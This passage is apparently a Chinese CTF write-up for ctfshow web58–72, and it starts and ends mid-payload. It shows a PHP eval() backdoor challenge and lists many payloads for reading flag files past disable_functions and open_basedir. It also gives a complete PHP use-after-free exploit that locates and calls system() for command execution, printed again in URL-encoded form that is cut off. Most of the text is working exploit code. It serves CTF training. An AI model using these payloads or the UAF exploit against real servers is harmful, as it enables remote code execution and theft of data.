+<pre><code>?c=$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))
+</code></pre>
+<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><h2 id="绕过disable-fuctions"><a href="#绕过disable-fuctions" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>获取文件路径</p>
+<pre><code>c=print_r(scandir(dirname(&#39;__FILE__&#39;)));
+c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot;&quot;);&#125;
+c=$a=opendir(&quot;./&quot;);while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;;&#125;;
+</code></pre>
+<p>读取文件</p>
+<p>通过单一函数读取文件</p>
+<pre><code>c=echo file_get_contents(&quot;flag.php&quot;);
+c=readfile(&quot;flag.php&quot;);
+c=var_dump(file(&quot;flag.php&quot;));
+c=print_r(file(&#39;flag.php&#39;)); 
+#file 把整个文件读到一个数组里
+</code></pre>
+<p>通过fopen读取文件</p>
+<pre><code>fread()
+fgets()
+fgetc()
+fgetss()
+fgetcsv()
+gpassthru()
+
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line =fgets($a);echo $line;&#125;#一行一行读
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;
+</code></pre>
+<p>通过高亮显示php文件</p>
+<pre><code>c=show_source(&quot;flag.php&quot;);
+c=highlight_file(&quot;flag.php&quot;);
+</code></pre>
+<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><h2 id="绕过disable-fuctions-1"><a href="#绕过disable-fuctions-1" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>查找flag文件的位置</p>
+<pre><code>c=print_r(scandir(&#39;./&#39;));
+</code></pre>
+<p>payload</p>
+<pre><code>//paylaod汇总
+c=highlight_file(&quot;flag.php&quot;);
+c=var_dump(file(&quot;flag.php&quot;)); 
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);
+</code></pre>
+<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><h2 id="绕过disable-fuctions-2"><a href="#绕过disable-fuctions-2" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>查找</p>
+<pre><code>c=print_r(scandir(&#39;./&#39;));
+</code></pre>
+<p>payload</p>
+<pre><code>c=highlight_file(&quot;flag.php&quot;);
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;
+不行的
+$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用
+</code></pre>
+<p>复制改名</p>
+<pre><code>复制后访问url/flag.txt
+copy()
+rename()
+
+c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+</code></pre>
+<h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><h2 id="绕过disable-fuctions-3"><a href="#绕过disable-fuctions-3" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>为了熟悉学习新姿势c&#x3D;$a&#x3D;opendir(‘.&#x2F;‘);while(($file &#x3D; readdir($a)) !&#x3D;false){echo $file.” “;}或者c&#x3D;print_r(scandir(current(localeconv())));</p>
+<pre><code>//payload:
+c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&#39;flag.php&#39;);
+c=highlight_file(next(array_reverse(scandir(current(localeconv())))));
+</code></pre>
+<h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><h2 id="绕过disable-fuctions-4"><a href="#绕过disable-fuctions-4" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>扫描目录c&#x3D;var_dump(scandir(“&#x2F;“));发现是flag.txt</p>
+<pre><code>//下面是payload
+c=include(&#39;/flag.txt&#39;);
+c=require(&#39;/flag.txt&#39;);
+c=require_once(&#39;/flag.txt&#39;);
+c=highlight_file(&#39;/flag.txt&#39;);
+</code></pre>
+<h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><h2 id="绕过disable-fuctions-5"><a href="#绕过disable-fuctions-5" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>快乐第一步扫描目录c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</p>
+<pre><code>//payload介绍
+c=include(&#39;/flag.txt&#39;);
+c=require(&#39;/flag.txt&#39;);
+c=require_once(&#39;/flag.txt&#39;);
+</code></pre>
+<h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><h2 id="exit-使程序提前退出"><a href="#exit-使程序提前退出" class="headerlink" title="exit();使程序提前退出"></a>exit();使程序提前退出</h2><pre><code class="php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set(&#39;display_errors&#39;, 0);
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+
+?&gt;
+
+你要上天吗？
+</code></pre>
+<ul>
+<li>ob_get_contents 返回输出缓冲区的内容</li>
+<li>ob_end_clean 清空缓冲区并关闭输出缓冲区</li>
+</ul>
+<pre><code>&lt;?php
+$a = &#39;system(&quot;ls&quot;);&#39;;
+eval($a);
+//在网页中会输出内容
+</code></pre>
+<pre><code>&lt;?php
+$a = &#39;system(&quot;ls&quot;);&#39;;
+eval($a);
+ob_get_contents();
+ob_end_clean();
+&lt;?php
+$a = &#39;system(&quot;ls&quot;);&#39;;
+eval($a);
+$c = ob_get_contents();
+ob_end_clean();
+echo $c;
+//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区
+</code></pre>
+<p>payload</p>
+<pre><code>c=require_once(&#39;/flag.txt&#39;);exit();
+</code></pre>
+<p>exit();使程序提前退出,绕过后面正则表达式</p>
+<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><h2 id="使用glob-x2F-x2F-伪协议绕过open-basedir"><a href="#使用glob-x2F-x2F-伪协议绕过open-basedir" class="headerlink" title="使用glob:&#x2F;&#x2F;伪协议绕过open_basedir"></a>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</h2><pre><code class="php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: Lazzaro
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-07 22:02:47
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set(&#39;display_errors&#39;, 0);
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;]))&#123;
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+
+?&gt;
+
+你要上天吗？
+</code></pre>
+<p>payload解释</p>
+<pre><code class="php">&lt;?php
+$a = &#39;?&gt;&lt;?php echo 111;?&gt;&#39;;
+eval($a);
+#111
+</code></pre>
+<p>这里的?&gt;是为了闭合前面的&lt;?php</p>
+<p>看位置</p>
+<pre><code class="php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob://./*&quot;);
+foreach($a as $f)
+&#123;echo($f-&gt;__toString().&#39; &#39;);
+&#125;
+exit(0);
+?&gt;
+</code></pre>
+<p>读文件没权限</p>
+<h2 id="uaf绕过open-basedir执行命令"><a href="#uaf绕过open-basedir执行命令" class="headerlink" title="uaf绕过open_basedir执行命令"></a>uaf绕过open_basedir执行命令</h2><pre><code class="php">
+function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123; 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace = debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+
+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+
+    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) &#123;
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+
+    function ptr2str($ptr, $m = 8) &#123;
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) &#123;
+            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;= 8;
+        &#125;
+        return $out;
+    &#125;
+
+    function write(&amp;$str, $p, $v, $n = 8) &#123;
+        $i = 0;
+        for($i = 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;= 8;
+        &#125;
+    &#125;
+
+    function leak($addr, $p = 0, $s = 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+
+    function parse_elf($base) &#123;
+        $e_type = leak($base, 0x10, 2);
+
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+
+        for($i = 0; $i &lt; $e_phnum; $i++) &#123;
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+
+            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; 
+
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; 
+                $text_size = $p_memsz;
+            &#125;
+        &#125;
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                
+                if($deref != 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+
+    function get_binary_base($binary_leak) &#123;
+        $base = 0;
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) &#123;
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+
+    function get_system($basic_funcs) &#123;
+        $addr = $basic_funcs;
+        do &#123;
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+
+            if($f_name == 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr += 0x20;
+        &#125; while($f_entry != 0);
+        return false;
+    &#125;
+
+    function trigger_uaf($arg) &#123;
+
+        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+    &#125;
+
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
+
+    $n_alloc = 10; 
+    $contiguous = [];
+    for($i = 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+
+    trigger_uaf(&#39;x&#39;);
+    $abc = $backtrace[1][&#39;args&#39;][0];
+
+    $helper = new Helper;
+    $helper-&gt;b = function ($x) &#123; &#125;;
+
+    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj = str2ptr($abc, 0x20);
+
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+
+    if(!($elf = parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+
+    if(!($zif_system = get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+
+
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i &lt; 0x110; $i += 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); 
+    write($abc, 0xd0 + 0x68, $zif_system); 
+
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+
+ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();
+</code></pre>
+<p>url编下码</p>
+<pre><code>c=%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(